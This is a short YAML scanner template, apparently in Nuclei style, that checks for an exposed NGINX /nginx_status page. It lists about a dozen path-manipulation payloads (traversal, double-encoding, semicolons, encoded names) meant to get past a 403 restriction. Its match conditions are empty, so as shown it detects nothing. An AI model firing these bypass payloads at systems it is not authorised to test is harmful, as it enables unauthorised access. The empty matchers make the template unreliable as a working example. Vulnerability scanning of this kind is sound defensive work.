id: nginx-status-403-bypass
brief:
    title: Nginx Status Page - 403 Bypass
    by: pussycat0x
    level: low
    about: Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
    label:
        - nginx
        - status
        - disclosure
        - bypass
        - misconfig
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/nginx_status'
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/../nginx_status'
        - '{{BaseURL}}/./nginx_status'
        - '{{BaseURL}}/.//nginx_status'
        - '{{BaseURL}}/./..;/nginx_status'
        - '{{BaseURL}}/%2e%2e/nginx_status'
        - '{{BaseURL}}/./%252e%252e/nginx_status'
        - '{{BaseURL}}/./%6e%67%69%6e%78_%73%74%61%74%75%73'
        - '{{BaseURL}}/;/nginx_status'
        - '{{BaseURL}}/./?/nginx_status'
        - '{{BaseURL}}/./nginx_status;'
        - '{{BaseURL}}/./nginx_status%20'
        - '{{BaseURL}}/./nginx_status/'
      signs: []
